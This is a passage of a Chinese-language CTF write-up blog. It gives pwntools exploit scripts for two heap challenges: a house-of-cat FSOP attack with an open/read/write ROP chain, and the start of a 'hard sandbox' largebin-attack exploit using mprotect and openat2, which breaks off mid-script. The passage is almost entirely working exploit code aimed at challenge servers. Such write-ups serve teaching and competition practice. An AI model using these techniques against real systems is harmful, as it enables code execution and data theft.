class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line">local_file = <span class="string">&#x27;/home/feichai/ctf_file/pwn&#x27;</span></span><br><span class="line">elf=ELF(local_file)</span><br><span class="line">local_libc = elf.libc.path</span><br><span class="line">libc=ELF(local_libc, checksec = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        shell wmctrl -r :ACTIVE: -b add,above</span></span><br><span class="line"><span class="string">        shell wmctrl -r :ACTIVE: -e 0,110,80,1700,1300</span></span><br><span class="line"><span class="string">        b *$rebase(0x22DC)</span></span><br><span class="line"><span class="string">        b *$rebase(0x14CE)</span></span><br><span class="line"><span class="string">        b *$rebase(0x1696)</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        io = process(local_file)</span><br><span class="line">        gdb.attach(io, gdbscript)</span><br><span class="line">    <span class="keyword">elif</span> args.PROCESS:</span><br><span class="line">        io = process(local_file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;139.155.126.78&quot;</span>,<span class="number">31459</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   io.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   io.recvuntil(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   io.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   io.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">b&#x27;distance.&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,From,To,content=<span class="string">b&#x27;aaaa&#x27;</span></span>): <span class="comment">#20</span></span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">if</span> size == <span class="number">0x510</span>:   </span><br><span class="line">        sla(<span class="string">b&#x27;car/train/plane?&#x27;</span>,<span class="string">b&#x27;car&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> size == <span class="number">0x520</span>:   </span><br><span class="line">        sla(<span class="string">b&#x27;car/train/plane?&#x27;</span>,<span class="string">b&#x27;train&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> size == <span class="number">0x530</span>:   </span><br><span class="line">        sla(<span class="string">b&#x27;car/train/plane?&#x27;</span>,<span class="string">b&#x27;plane&#x27;</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;From where?&#x27;</span>,From)</span><br><span class="line">    sla(<span class="string">b&#x27;To where?&#x27;</span>,To)</span><br><span class="line">    sla(<span class="string">b&#x27;How far?&#x27;</span>,<span class="string">b&#x27;900&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;Note:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">From,To</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;From where?&#x27;</span>,From)</span><br><span class="line">    sla(<span class="string">b&#x27;To where?&#x27;</span>,To)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">From,To</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;From where?&#x27;</span>,From)</span><br><span class="line">    sla(<span class="string">b&#x27;To where?&#x27;</span>,To)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">From,To,idx,content</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;From where?&#x27;</span>,From)</span><br><span class="line">    sla(<span class="string">b&#x27;To where?&#x27;</span>,To)</span><br><span class="line">    sla(<span class="string">b&#x27;change?&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">b&#x27;How far?&#x27;</span>,<span class="string">b&#x27;900&#x27;</span>)</span><br><span class="line">    sa(<span class="string">b&#x27;Note:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Dijkstra</span>(<span class="params">cities</span>):</span><br><span class="line">    choice(<span class="number">5</span>)</span><br><span class="line">    sla(<span class="string">b&#x27;travel?&#x27;</span>,cities)</span><br><span class="line"></span><br><span class="line">c = [<span class="string">&#x27;guangzhou&#x27;</span>,<span class="string">&#x27;nanning&#x27;</span>,<span class="string">&#x27;changsha&#x27;</span>,<span class="string">&#x27;nanchang&#x27;</span>,<span class="string">&#x27;fuzhou&#x27;</span>]</span><br><span class="line">chunk_list = <span class="number">0x50C0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x510</span>,c[<span class="number">0</span>],c[<span class="number">1</span>]) <span class="comment">#0</span></span><br><span class="line">    add(<span class="number">0x510</span>,c[<span class="number">1</span>],c[<span class="number">2</span>]) <span class="comment">#1</span></span><br><span class="line">    add(<span class="number">0x530</span>,c[<span class="number">2</span>],c[<span class="number">3</span>]) <span class="comment">#2</span></span><br><span class="line">    Dijkstra(c[<span class="number">3</span>])</span><br><span class="line">    free(c[<span class="number">1</span>],c[<span class="number">2</span>])</span><br><span class="line">    free(c[<span class="number">0</span>],c[<span class="number">1</span>])</span><br><span class="line">    add(<span class="number">0x530</span>,c[<span class="number">0</span>],c[<span class="number">1</span>],<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x510</span>) <span class="comment">#3</span></span><br><span class="line">    show(c[<span class="number">0</span>],c[<span class="number">1</span>])</span><br><span class="line">    libc_base = u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x21ace0</span></span><br><span class="line">    lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">    setcontext = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">    stderr = libc_base + libc.sym[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">    _IO_list_all = libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    free(c[<span class="number">0</span>],c[<span class="number">1</span>])</span><br><span class="line">    add(<span class="number">0x510</span>,c[<span class="number">0</span>],c[<span class="number">1</span>]) <span class="comment">#4</span></span><br><span class="line">    add(<span class="number">0x530</span>,c[<span class="number">1</span>],c[<span class="number">2</span>]) <span class="comment">#5</span></span><br><span class="line">    add(<span class="number">0x510</span>,c[<span class="number">2</span>],c[<span class="number">3</span>],<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>) <span class="comment">#6</span></span><br><span class="line">    show(c[<span class="number">2</span>],c[<span class="number">3</span>])</span><br><span class="line">    ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    heap_base = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x1990</span></span><br><span class="line">    lg(<span class="string">&#x27;heap_base&#x27;</span>,heap_base)</span><br><span class="line">    ret = <span class="number">0x0000000000029139</span> + libc_base</span><br><span class="line">    pop_rdi = <span class="number">0x000000000002a3e5</span> + libc_base</span><br><span class="line">    pop_rsi = <span class="number">0x000000000002be51</span> + libc_base</span><br><span class="line">    pop_rdx_r12 = <span class="number">0x000000000011f2e7</span> + libc_base</span><br><span class="line">    pop_rax = <span class="number">0x0000000000045eb0</span> + libc_base</span><br><span class="line"></span><br><span class="line">    <span class="comment">#house of cat</span></span><br><span class="line">    fake_io_addr=heap_base+<span class="number">0x4850</span> <span class="comment"># 伪造的fake_IO结构体的地址</span></span><br><span class="line">    _flags = <span class="number">0</span></span><br><span class="line">    fake_IO_FILE =  <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="comment">#fake_IO_FILE += p64(_flags) #_flags=rdi</span></span><br><span class="line">    fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">    fake_IO_FILE += p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="comment"># rcx!=0(FSOP)</span></span><br><span class="line">    fake_IO_FILE += p64(fake_io_addr+<span class="number">0xb0</span>) <span class="comment">#_IO_backup_base=rdx</span></span><br><span class="line">    fake_IO_FILE += p64(setcontext + <span class="number">61</span>) <span class="comment">#_IO_save_end=call addr(call setcontext/system)</span></span><br><span class="line">    fake_IO_FILE  = fake_IO_FILE.ljust(<span class="number">0x68</span>-<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_IO_FILE += p64(<span class="number">0</span>)  <span class="comment"># _chain</span></span><br><span class="line">    fake_IO_FILE  = fake_IO_FILE.ljust(<span class="number">0x88</span>-<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_IO_FILE += p64(heap_base+<span class="number">0x1000</span>) <span class="comment"># _lock = a writable address</span></span><br><span class="line">    fake_IO_FILE  = fake_IO_FILE.ljust(<span class="number">0xa0</span>-<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_IO_FILE += p64(fake_io_addr+<span class="number">0x30</span>) <span class="comment">#_wide_data,rax1</span></span><br><span class="line">    fake_IO_FILE  = fake_IO_FILE.ljust(<span class="number">0xc0</span>-<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_IO_FILE += p64(<span class="number">1</span>) <span class="comment">#mode=1</span></span><br><span class="line">    fake_IO_FILE  = fake_IO_FILE.ljust(<span class="number">0xd8</span>-<span class="number">0x20</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_IO_FILE += p64(libc_base+libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]+<span class="number">0x30</span>) <span class="comment"># vtable=IO_wfile_jumps+0x10 FSOP改为IO_wfiel_jumps+0x30</span></span><br><span class="line">    fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">    fake_IO_FILE += p64(fake_io_addr+<span class="number">0x40</span>) <span class="comment"># #rax2 -&gt; to make [rax+0x18] = setcontext + 61</span></span><br><span class="line">    payload = fake_IO_FILE + p64(<span class="number">0</span>)*<span class="number">7</span> + p64(heap_base+<span class="number">0x4330</span>+<span class="number">0x20</span>+<span class="number">8</span>) + p64(ret)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">open</span> = libc.sym[<span class="string">&quot;open&quot;</span>] + libc_base</span><br><span class="line">    read = libc.sym[<span class="string">&quot;read&quot;</span>] + libc_base</span><br><span class="line">    write = libc.sym[<span class="string">&quot;write&quot;</span>] + libc_base</span><br><span class="line"></span><br><span class="line">    flag_str = heap_base + <span class="number">0x3e10</span> + <span class="number">0x20</span></span><br><span class="line">    flag_addr = heap_base + <span class="number">0x6000</span></span><br><span class="line"></span><br><span class="line">    orw = <span class="string">b&#x27;\x00\x00\x00\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line">    orw += p64(pop_rdi) + p64(flag_str)</span><br><span class="line">    orw += p64(pop_rsi) + p64(<span class="number">0</span>)</span><br><span class="line">    orw += p64(<span class="built_in">open</span>)</span><br><span class="line"></span><br><span class="line">    orw += p64(pop_rdi) + p64(<span class="number">3</span>)</span><br><span class="line">    orw += p64(pop_rsi) + p64(flag_addr)</span><br><span class="line">    orw += p64(pop_rdx_r12) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    orw += p64(read)</span><br><span class="line"></span><br><span class="line">    orw += p64(pop_rdi) + p64(<span class="number">1</span>)</span><br><span class="line">    orw += p64(pop_rsi) + p64(flag_addr)</span><br><span class="line">    orw += p64(pop_rdx_r12) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>)</span><br><span class="line">    orw += p64(write)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x520</span>,c[<span class="number">0</span>],c[<span class="number">0</span>]) <span class="comment">#7</span></span><br><span class="line">    add(<span class="number">0x520</span>,c[<span class="number">1</span>],c[<span class="number">1</span>]) <span class="comment">#8</span></span><br><span class="line">    add(<span class="number">0x520</span>,c[<span class="number">2</span>],c[<span class="number">2</span>]) <span class="comment">#9</span></span><br><span class="line">    add(<span class="number">0x520</span>,c[<span class="number">3</span>],c[<span class="number">3</span>]) <span class="comment">#10</span></span><br><span class="line">    add(<span class="number">0x520</span>,c[<span class="number">4</span>],c[<span class="number">4</span>]) <span class="comment">#11 0x3df0</span></span><br><span class="line">    add(<span class="number">0x520</span>,c[<span class="number">0</span>],c[<span class="number">2</span>]) <span class="comment">#12 0x4330</span></span><br><span class="line">    add(<span class="number">0x510</span>,c[<span class="number">0</span>],c[<span class="number">3</span>],payload) <span class="comment">#13 0x4850</span></span><br><span class="line"></span><br><span class="line">    free(c[<span class="number">0</span>],c[<span class="number">2</span>])</span><br><span class="line">    free(c[<span class="number">4</span>],c[<span class="number">4</span>]) </span><br><span class="line">    free(c[<span class="number">3</span>],c[<span class="number">3</span>]) </span><br><span class="line">    free(c[<span class="number">2</span>],c[<span class="number">2</span>]) </span><br><span class="line">    free(c[<span class="number">1</span>],c[<span class="number">1</span>]) </span><br><span class="line">    free(c[<span class="number">0</span>],c[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0x530</span>,c[<span class="number">2</span>],c[<span class="number">3</span>]) <span class="comment">#14 0x2930</span></span><br><span class="line">    add(<span class="number">0x530</span>,c[<span class="number">2</span>],c[<span class="number">3</span>]) <span class="comment">#15 0x2e70</span></span><br><span class="line">    add(<span class="number">0x530</span>,c[<span class="number">0</span>],c[<span class="number">4</span>],<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x531</span>)+p32(<span class="number">3</span>)+p32(<span class="number">3</span>)) <span class="comment">#16 0x33b0</span></span><br><span class="line">    add(<span class="number">0x510</span>,c[<span class="number">2</span>],c[<span class="number">3</span>],<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4e0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x531</span>)+p32(<span class="number">4</span>)+p32(<span class="number">4</span>)) <span class="comment">#17 0x38f0</span></span><br><span class="line">    add(<span class="number">0x510</span>,c[<span class="number">2</span>],c[<span class="number">3</span>],<span class="string">b&#x27;./flag\x00\x00&#x27;</span>) <span class="comment">#18 0x3e10</span></span><br><span class="line">    add(<span class="number">0x510</span>,c[<span class="number">2</span>],c[<span class="number">3</span>],orw) <span class="comment">#19 0x4330</span></span><br><span class="line"></span><br><span class="line">    free(c[<span class="number">3</span>],c[<span class="number">3</span>])</span><br><span class="line">    add(<span class="number">0x530</span>,c[<span class="number">2</span>],c[<span class="number">3</span>])</span><br><span class="line">    pd = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x531</span>)</span><br><span class="line">    pd += p64(libc_base+<span class="number">0x21b110</span>)*<span class="number">2</span>+p64(heap_base+<span class="number">0x38c0</span>)+p64(_IO_list_all-<span class="number">0x20</span>)</span><br><span class="line">    lg(<span class="string">&#x27;stderr&#x27;</span>,stderr)</span><br><span class="line"></span><br><span class="line">    edit(c[<span class="number">0</span>],c[<span class="number">4</span>],<span class="number">0</span>,pd)</span><br><span class="line">    free(c[<span class="number">0</span>],c[<span class="number">3</span>])</span><br><span class="line">    add(<span class="number">0x530</span>,c[<span class="number">2</span>],c[<span class="number">3</span>])</span><br><span class="line">    lg(<span class="string">&quot;IO_flush_all&quot;</span>,libc_base+<span class="number">0x8E95B</span>)</span><br><span class="line">    </span><br><span class="line">    pause()</span><br><span class="line">    choice(<span class="number">6</span>)</span><br><span class="line"></span><br><span class="line">    io.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><h3 id="hard-sandbox"><a href="#hard-sandbox" class="headerlink" title="hard sandbox"></a>hard sandbox</h3><p>这道题并不难，但是我只在本地读出了flag，远程读不出来，但是不影响，实际上题解就是这样，主办方说唯独这题不是他们出的，他们去问过flag路径和内核版本，出题的人都不肯说，挺无语的。。。</p><p>思路是利用largebin attack伪造_IO_list_all,然后调用mprotect赋权，再用openat2+read+write即可</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p8,p16,p32,p64,u32,u64</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line">local_file = <span class="string">&#x27;/home/feichai/ctf_file/pwn&#x27;</span></span><br><span class="line">elf=ELF(local_file)</span><br><span class="line">local_libc = elf.libc.path</span><br><span class="line">libc=ELF(local_libc, checksec = <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        gdbscript = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        shell wmctrl -r :ACTIVE: -b add,above</span></span><br><span class="line"><span class="string">        shell wmctrl -r :ACTIVE: -e 0,110,80,1700,1300</span></span><br><span class="line"><span class="string">        b *$rebase(0x1815)</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        io = process(local_file)</span><br><span class="line">        gdb.attach(io, gdbscript)</span><br><span class="line">    <span class="keyword">elif</span> args.PROCESS:</span><br><span class="line">        io = process(local_file)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = remote(<span class="string">&quot;49.234.30.109&quot;</span>,<span class="number">9999</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">s, addr</span>):</span><br><span class="line">    <span class="keyword">return</span> info(<span class="string">f&#x27;\033[1;33m<span class="subst">&#123;<span class="string">f&quot;<span class="subst">&#123;s&#125;</span>--&gt;0x<span class="subst">&#123;addr:02x&#125;</span>&quot;</span>&#125;</span>\033[0m&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r   = <span class="keyword">lambda</span> a:   io.recv(a)</span><br><span class="line">ru  = <span class="keyword">lambda</span> a:   io.recvuntil(a)</span><br><span class="line">s   = <span class="keyword">lambda</span> a:   io.send(a)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b: io.sendafter(a,b)</span><br><span class="line">sl  = <span class="keyword">lambda</span> a:   io.sendline(a)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b: io.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt;&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&#x27;Size: &#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&#x27;Content: &#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Index: &#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0</span>,<span class="number">0x520</span>) <span class="comment">#0</span></span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x530</span>) <span class="comment">#1</span></span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x518</span>) <span class="comment">#2</span></span><br><span class="line">    free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">3</span>,<span class="number">0x540</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">    show(<span class="number">0</span>) <span class="comment">#0</span></span><br><span class="line">    libc_base = u64(ru(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x1f70f0</span></span><br><span class="line">    lg(<span class="string">&quot;libc_base&quot;</span>,libc_base)</span><br><span class="line">    edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    show(<span class="number">0</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">    heap_base = u64(r(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>)) - <span class="number">0x290</span></span><br><span class="line">    lg(<span class="string">&quot;heap_base&quot;</span>,heap_base)</span><br><span class="line">    edit(<span class="number">0</span>,p64(libc_base + <span class="number">0x1f70f0</span>)*<span class="number">2</span>)</span><br><span class="line">    </span><br><span class="line">    pop_rdi =libc_base + <span class="number">0x0000000000023b65</span></span><br><span class="line">    pop_rsi = libc_base + <span class="number">0x00000000000251be</span></span><br><span class="line">    pop_rdx = libc_base +<span class="number">0x0000000000166262</span></span><br><span class="line">    pop_rax = libc_base + <span class="number">0x000000000003fa43</span></span><br><span class="line">    ret = libc_base + <span class="number">0x50878</span></span><br><span class="line"></span><br><span class="line">    stderr=libc_base+libc.sym[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">    _IO_list_all = libc_base+libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">    setcontext=libc_base+libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">    setuid=libc_base+libc.sym[<span class="string">&#x27;setuid&#x27;</span>]</span><br><span class="line">    close=libc_base+libc.sym[<span class="string">&#x27;close&#x27;</span>]</span><br><span class="line">    read=libc_base+libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">    puts=libc_base+libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    syscall_ret=libc_base + <span class="number">0x8CC36</span> <span class="comment"># syscall; ret; </span></span><br><span class="line">    fake_io_addr = heap_base + <span class="number">0xd00</span></span><br><span class="line">    rop_addr = heap_base + <span class="number">0x2750</span></span><br><span class="line">    flag_addr = heap_base + <span class="number">0x2c90</span></span><br><span class="line">    mprotect = libc_base + libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">    <span class="comment"># _flags = 0 #_IO_read_ptr = 0x521</span></span><br><span class="line"></span><br><span class="line">    fake_IO_FILE =  <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="comment">#fake_IO_FILE += p64(_flags) #_flags=rdi</span></span><br><span class="line">    fake_IO_FILE += p64(<span class="number">0</span>)*<span class="number">6</span></span><br><span class="line">    fake_IO_FILE += p64(<span class="number">1</span>)+p64(<span class="number">2</span>) <span class="comment"># 